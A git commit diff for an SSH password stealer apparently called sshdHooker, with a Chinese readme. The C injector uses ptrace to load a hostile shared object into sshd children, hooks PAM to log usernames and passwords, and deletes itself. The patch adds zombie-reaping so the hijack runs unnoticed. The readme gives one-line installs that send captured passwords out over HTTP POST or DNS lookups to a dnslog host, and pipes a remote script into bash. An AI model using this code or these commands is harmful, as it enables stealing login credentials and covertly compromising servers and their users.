0f21d1c220e25f594867166a36cb3ca69e328372
9bie <blackguwc@163.com>
2023-06-06 17:59:24 +0800

    修复ptrace接管修改父进程造成sshd子进程无法处理产生僵尸进程的问题

--- install.sh
+++ install.sh
@@ -38,6 +38,7 @@ cat>"${inject_s}"<<EOF
 #include <stdlib.h>
 #include <pthread.h>
 #include <stdio.h>
+#include <signal.h> 
 #include <unistd.h>
 #include <sys/ptrace.h>
 #include <sys/types.h>
@@ -50,9 +51,14 @@ cat>"${inject_s}"<<EOF
 #include <dlfcn.h>
 #include <signal.h>
 #include <string.h>
+#include <sys/wait.h>
 
 char evilSoPath[] = "THISISEVILSOPATH";
 char libcRegEx[] = "THISISLIBCSTRING";
+struct gcStack {
+    struct gcStack * up;
+    pid_t * target_pid;
+} * gcs;
 int ptrace_read(int pid, unsigned long addr, void *data, unsigned int len)
 {
     int bytesRead = 0;
@@ -217,7 +223,7 @@ int ptrace_getregs( pid_t pid, struct user_regs_struct* regs )
 {
     if ( ptrace( PTRACE_GETREGS, pid, NULL, regs ) < 0 )
     {
-        perror( "ptrace_getregs: Can not get register values" );
+        printf( "- [Getregs][%d] Can not get register values\n",pid );
         return -1;
     }
 
@@ -228,7 +234,7 @@ int ptrace_setregs( pid_t pid, struct user_regs_struct* regs )
 {
     if ( ptrace( PTRACE_SETREGS, pid, NULL, regs ) < 0 )
     {
-        perror( "ptrace_setregs: Can not set register values" );
+        printf( "- [Setregs][%d] Can not set register values\n",pid );
         return -1;
     }
 
@@ -383,6 +389,45 @@ void* get_remote_addr( pid_t target_pid, const char* module_name, void* local_ad
 
 //=====================utils end=====================
 
+void ManualGC(pid_t target_pid){
+    struct user_regs_struct regs,original_regs;
+    char libc_path[255];
+    void * handle = dlopen(libc_path,RTLD_LAZY);
+    get_libc_path(target_pid,libc_path);
+    void * self_waitpid_addr = dlsym(handle,"waitpid");
+    printf("+ [ManualGC][%d] Self Waitpid address:%p\n",target_pid,self_waitpid_addr);
+    void* libc_moudle_base = get_module_base(-1,libcRegEx);
+    void* waitpid_addr = get_remote_addr( target_pid, libcRegEx, (void *)self_waitpid_addr );
+    printf("+ [ManualGC][%d] Remote Waitpid address:%p\n",target_pid,waitpid_addr);
+    if ( ptrace_getregs( target_pid, &regs ) == -1 ){
+        printf("- [ManualGC][%d] Getregs Error,target: %d\n",target_pid,target_pid );
+        return -1;
+    }
+    memcpy(&original_regs,&regs,sizeof(struct user_regs_struct));
+    while(1){
+        long parameters[3];
+        parameters[0] = -1;      
+        parameters[1] = NULL; 
+        parameters[2] = WNOHANG ; 
+        if(ptrace_call( target_pid, (uint64_t)waitpid_addr, parameters, 3,&regs,0 )==-1){
+                printf("- [ManualGC][%d] Writedata Error\n",target_pid );
+                return -1;
+        }
+        ptrace_getregs( target_pid, &regs ); // 获得调用结果
+        int retval = regs.rax;
+        printf("+ [ManualGC][%d] waitpid = %ld \n",target_pid,retval );
+        if(retval == -1||retval == 0||retval == 4294967295){ // 4294967295 == -1
+            break;
+        }
+    }
+    
+
+    ptrace_setregs( target_pid, &original_regs );
+    ptrace_continue( target_pid );
+
+
+}
+
 int Inject_Shellcode(pid_t target_pid){
         struct user_regs_struct regs, original_regs;
         void *malloc_addr, *dlopen_mode_addr,*mmap_addr;
@@ -394,17 +439,16 @@ int Inject_Shellcode(pid_t target_pid){
         
         fp = fopen(evilSoPath,"r");
         if(fp == NULL){
-            printf("- Cannot find so file, Exit and remove");
+            printf("! [Inject][%d] Cannot find so file, Exit and remove",target_pid);
             char buf[ 1024 ];
-                int count;
-                count = readlink( "/proc/self/exe", buf, 1024 );
-                if ( count < 0 || count >= 1024 )
-                { 
-                        printf( "Failed\n" );
+	        int count;
+	        count = readlink( "/proc/self/exe", buf, 1024 );
+	        if ( count < 0 || count >= 1024 )
+	        { 
                 exit(0);
-                }
-                buf[ count ] = '\0';
-                char cmd[1024];
+	        }
+	        buf[ count ] = '\0';
+	        char cmd[1024];
             snprintf(cmd,2048,"rm %s",buf);
             system(cmd);
             exit(0);
@@ -413,17 +457,17 @@ int Inject_Shellcode(pid_t target_pid){
         }
         if ( ptrace_attach( target_pid ) == -1 ){
 
-                printf("inject attach failed\n" );
+                printf("- [Inject][%d] inject attach failed\n",target_pid );
                 return -1;
         }
-        printf ("+ Waiting for process...\n");
-        printf ("+ Getting Registers\n");
+        printf ("+ [Inject][%d] Waiting for process...\n",target_pid);
+        printf ("+ [Inject][%d] Getting Registers\n",target_pid);
         if ( ptrace_getregs( target_pid, &regs ) == -1 ){
                 printf("- Getregs Error\n" );
                 return -1;
         }
         memcpy(&original_regs,&regs,sizeof(struct user_regs_struct));
-        printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
+        printf ("+ [Inject][%d] Injecting shell code at %p\n", target_pid,(void*)regs.rip);
         
 
         
@@ -431,7 +475,7 @@ int Inject_Shellcode(pid_t target_pid){
         libc_moudle_base = get_module_base(-1,libcRegEx);
         get_libc_path(target_pid,libc_path);
         if(libc_moudle_base==NULL){
-            printf("- Can't find libc-xxxx,try to find libc.so.x\n");
+            printf("- [Inject][%d] Can't find libc-xxxx,try to find libc.so.x\n",target_pid);
             char tmp_libc[] = "libc.so";
             strcpy(libcRegEx,tmp_libc);
             libc_moudle_base = get_module_base(-1,libcRegEx);
@@ -439,10 +483,10 @@ int Inject_Shellcode(pid_t target_pid){
         }
 
         void * handle = dlopen(libc_path,RTLD_LAZY);
-        void * self_dlopen_mode_addr = dlsym(handle,"__libc_dlopen_mode");
+        void * self_dlopen_mode_addr = dlsym(handle,"dlopen");
         if(self_dlopen_mode_addr==NULL){
-            printf("- Can't find __libc_dlopen_mode in libc,try to use dlopen\n");
-            self_dlopen_mode_addr = dlsym(handle,"dlopen");
+            printf("- [Inject][%d] Can't find dlopen in libc,try to use __libc_dlopen_mode\n",target_pid);
+            self_dlopen_mode_addr = dlsym(handle,"__libc_dlopen_mode");
         }
         void * self_malloc_addr = dlsym(handle,"malloc");
         void * self_mmap_addr = dlsym(handle,"mmap");
@@ -450,12 +494,12 @@ int Inject_Shellcode(pid_t target_pid){
         mmap_addr = get_remote_addr( target_pid, libcRegEx, (void *)self_mmap_addr );
         dlopen_mode_addr = get_remote_addr( target_pid, libcRegEx, (void *)self_dlopen_mode_addr );
         
-        printf("+ self libc moudle base:%p\n",libc_moudle_base);
-        printf("+ remote libc path:%s\n",libc_path);
-        printf("+ self libc_dlopen_mode base:%p\n",self_dlopen_mode_addr);
-        printf("+ remote malloc addr:%p\n",malloc_addr);
-        printf("+ remote mmap addr:%p local:%p\n",mmap_addr,self_mmap_addr);
-        printf("+ remote libc_dlopen_mode addr:%p\n",dlopen_mode_addr);
+        printf("+ [Inject][%d] self libc moudle base:%p\n",target_pid,libc_moudle_base);
+        printf("+ [Inject][%d] remote libc path:%s\n",target_pid,libc_path);
+        printf("+ [Inject][%d] self libc_dlopen_mode base:%p\n",target_pid,self_dlopen_mode_addr);
+        printf("+ [Inject][%d] remote malloc addr:%p\n",target_pid,malloc_addr);
+        printf("+ [Inject][%d] remote mmap addr:%p local:%p\n",target_pid,mmap_addr,self_mmap_addr);
+        printf("+ [Inject][%d] remote libc_dlopen_mode addr:%p\n",target_pid,dlopen_mode_addr);
 
 
 
@@ -469,17 +513,17 @@ int Inject_Shellcode(pid_t target_pid){
         parameters[5] = 0; //offset
 
         if(ptrace_call( target_pid, (uint64_t)mmap_addr, parameters, 6,&regs,0 )==-1){
-                printf("- Writedata Error\n" );
+                printf("- [Inject][%d]Writedata Error\n",target_pid );
                 return -1;
         }
         if ( ptrace_getregs( target_pid, &regs ) == -1 ){
-                printf("- Getregs Error\n" );
+                printf("- [Inject][%d] Getregs Error\n",target_pid );
                 return -1;
         }
-        printf("+ mmap result: %p\n",regs.rax);
+        printf("+ [Inject][%d] mmap result: %p\n",target_pid,regs.rax);
         remote_code_ptr = (char *)regs.rax; //获取mmap取得的地址
         ptrace_writedata(target_pid,remote_code_ptr,evilSoPath,strlen(evilSoPath)+1);
-        printf("+ Writing EvilSo Path at:%p\n",remote_code_ptr);
+        printf("+ [Inject][%d] Writing EvilSo Path at:%p\n",target_pid,remote_code_ptr);
         parameters[1] = 0x2;      // addr
         parameters[0] = remote_code_ptr; // size
         extern uint64_t _dlopen_mode_param1_s, _dlopen_mode_addr_s,_inject_start_s,_inject_end_s;
@@ -489,14 +533,17 @@ int Inject_Shellcode(pid_t target_pid){
         local_code_ptr = (uint8_t *)&_inject_start_s;
         code_length = (long)&_inject_end_s - (long)&_inject_start_s;
         ptrace_writedata(target_pid,remote_code_ptr,local_code_ptr,code_length ); //写入本地shellcode
-        printf("+ Writing Shellcode at:%p code length:%d\n",remote_code_ptr,code_length);
+        printf("+ [Inject][%d] Writing Shellcode at:%p code length:%d\n",target_pid,remote_code_ptr,code_length);
         regs.rip = (long)remote_code_ptr+6;
         ptrace_setregs( target_pid, &regs );
         ptrace_continue( target_pid );
         waitpid( target_pid, NULL, WUNTRACED  );
-        printf("+ EvilSo Injected.\n+ Recorver the regsing...\n-------------------------------\n");
+        printf("+ [Inject][%d] EvilSo Injected.Recorver the regsing...\n",target_pid);
         ptrace_setregs( target_pid, &original_regs );
+        
         ptrace_continue( target_pid );
+        //ptrace_detach(target_pid);
+        
 
 }
 
@@ -504,13 +551,14 @@ int Inject_Shellcode(pid_t target_pid){
 
 int WaitforLibPAM(pid_t target_pid){
     struct user_regs_struct regs;
+
     if ( ptrace_attach( target_pid ) == -1 ){
 
-        printf("WaitforLibPAM attach Failed\n" );
+        printf("- [WaitforLibPAM] WaitforLibPAM attach Failed\n" );
         return -1;
     }
     if ( ptrace_getregs( target_pid, &regs ) == -1 ){
-        printf("- Getregs Error\n" );
+        printf("- [WaitforLibPAM] Getregs Error\n" );
         return -1;
     }
     long num,bit=0,finded = 0;
@@ -524,7 +572,7 @@ int WaitforLibPAM(pid_t target_pid){
             ptrace_getregs( target_pid, &regs ) ;
             ptrace_readdata(target_pid,(void *)regs.rsi,path,255);
             if(strstr(path,libsystemd)){
-                printf("++ [%d][openat] SubProcess:openat find path: %s\n",target_pid,path);
+                printf("+ [WaitforLibPAM][%d] SubProcess:openat find path: %s\n",target_pid,path);
                 ptrace_detach(target_pid);
                 Inject_Shellcode(target_pid);
                 break;
@@ -534,7 +582,7 @@ int WaitforLibPAM(pid_t target_pid){
             ptrace_getregs( target_pid, &regs ) ;
             ptrace_readdata(target_pid,(void *)regs.rdi,path,255);
             if(strstr(path,libsystemd)){
-                printf("++ [%d][openat] SubProcess:open find path: %s\n",target_pid,path);
+                printf("+ [WaitforLibPAM][%d][openat] SubProcess:open find path: %s\n",target_pid,path);
                 ptrace_detach(target_pid);
                 Inject_Shellcode(target_pid);
                 break;
@@ -542,43 +590,76 @@ int WaitforLibPAM(pid_t target_pid){
         }
 
     }
-}
+    printf("+ [WaitforLibPAM][%d] Wait ChildProcess Ending\n",target_pid);
+    waitpid( target_pid,NULL,0 );
+    struct gcStack node;
+    node.up = gcs;
+    node.target_pid = target_pid;
+    gcs = &node;
 
+    printf("+ [WaitforLibPAM][%d] GC commit and ChildProcess End Successful\n",target_pid);
+}
 
 
 int main(int argc, char const *argv[])
 {
+    
 
     pid_t                   target_pid;
     target_pid = atoi (argv[1]);
     struct user_regs_struct regs;
+
+    
+    
+
     if ( ptrace_attach( target_pid ) == -1 ){
 
-        printf("attach\n" );
+        printf("- [Main][%d] Attach Failed\n",target_pid );
         return -1;
     }
-    printf ("+ Waiting for process...\n");
-    printf ("+ Getting Registers\n");
+    printf ("+ [Main][%d] Waiting for process...\n",target_pid);
+    printf ("+ [Main][%d] Getting Registers\n",target_pid);
     if ( ptrace_getregs( target_pid, &regs ) == -1 ){
-        printf("- Getregs Error\n" );
+        printf("- [Main][%d] Getregs Error\n" ,target_pid);
         return -1;
     }
-    printf ("+ RAX is %p\n", (void*)regs.rax);
+    printf ("+ [Main][%d] RAX is %p\n",target_pid, (void*)regs.rax);
     long num,subprocess;
+    // 初始化栈顶
+    struct gcStack bottom;
+    bottom.up=NULL;
+    bottom.target_pid = 0;
+    gcs = &bottom;
+
+
+
+    printf ("+ [Main][%d] Initialization stack successful\n",target_pid);
+
     while(1){
+        if(gcs->up != NULL){
+            // need GC
+            printf ("+ [Main][%d] ManualGC Start\n",target_pid);
+            ManualGC(target_pid);
+            gcs = gcs->up;
+            printf ("+ [Main][%d] ManualGC End\n------------------------------------\n",target_pid);
+            
+        }
         ptrace( PTRACE_SYSCALL, target_pid, NULL, 0  );
         waitpid( target_pid, NULL, WUNTRACED );
         pthread_t id;
         num = ptrace(PTRACE_PEEKUSER, target_pid, ORIG_RAX * 8, NULL);// 获得调用号值
+        //printf("+ Now Number = %d\n",num);
         if(num == 56){
             ptrace_getregs( target_pid, &regs ); // 获得调用结果
-            printf("+ Process maybe = %ld \n", regs.rax);
+            printf("+ [Main][%d] Process maybe = %ld \n",target_pid, regs.rax);
             subprocess = regs.rax;
             if(subprocess > 0){
+                //ManualGC(target_pid);
                 pthread_create(&id,NULL,(void *) WaitforLibPAM,subprocess);
             }
 
         }
+        
     }
 
         return 0;
@@ -859,7 +940,7 @@ int my_pam_set_data(struct pam_handle *pamh, const char *module_data_name, void 
             if(SEND_MODE == 0){
                 FILE *fp = NULL;
                 fp = fopen(SEND_TARGET, "a+");
-                fprintf(fp,"pam module_data_name: %s %d\n",module_data_name,*(int *)data);
+                //fprintf(fp,"pam module_data_name: %s %d\n",module_data_name,*(int *)data);
                 int ret = *(int*)data;
                 if(ret == 0){
                         fprintf(fp,"login successful username is : %s    password is: %s\n",pamh->user,pamh->authtok);
---
+++ readme_cn.md
@@ -0,0 +1,68 @@
+# what's this?
+
+注入SSHD之后就能记录下密码或者做其他操作。
+
+
+需要关闭selinux
+
+[English](readme.md) | 中文文档
+
+# how to use
+
+## auto installer
+密码记录器一键安装，仅暂时支持x64
+
+直接执行命令
+```
+bash install.sh
+```
+
+直接运行后ssh密码登录，记录地址为/tmp/.password.txt，默认so地址为/tmp/hello.so，默认注入器名字为/tmp/.i
+
+
+其他参数：
+```
+    -e   修改so文件的路径，默认/tmp/hello.so
+    -o   修改注入器的路径，默认/tmp/.i.
+    -m   修改mode默认值为0，输出到文件，默认记录地址为/tmp/.password.txt ，如果值为1，则会改为命令行模式
+    -p   修改payload，默认值为/tmp/.password.txt，如果mode值为1，则会使用snsprintf来格式化命令并且输出，请确保字符串中包含两个%s，用于格式化用户名和密码
+    -d   自动删除，设置为anyone则抓到密码后立刻删除，否则则抓取到设置的指定用户名后删除
+    -l   指定libc路径，默认寻址是寻找libc-xxxx.so和libc.so.x的方案，但是不排除会有其他奇奇怪怪的libc名称，所以添加了手动指定功能，详情可以查看/proc/pid/maps里找到libc名字
+```
+## 例子
+
+https发送密码
+```
+bash install.sh -p "curl -X POST -d 'username=%s\&password=%s' http://127.0.0.1" -m 1
+```
+
+dns发送密码并且自动删除
+```
+bash install.sh -p 'ping `echo %s-%s|xxd -ps`.k9lovy.dnslog.cn -c 1' -m 1 -d anyone
+```
+
+远程快速自动部署并自动删除
+```
+curl -L https://github.com/9bie/sshdHooker/releases/download/1.0.2/sshdHooker.sh | bash -s -- -d anyone
+```
+
+## debug
+
+执行
+```
+
+gcc -shared inject_got.c -ldl -fPIC -o test2.so -std=c99
+
+mv test2.so /tmp/hello.so
+
+gcc sshdHooker.c shellcode.s -g -o inject -ldl -lpthread
+
+sudo ./inject sshd_pid
+```
+
+然后等待用户连接SSH并且登录成功，密码保存于/tmp/.password.txt
+
+# todo
+
+ - 增加x86/arm支持
+ - bypass SELINUX
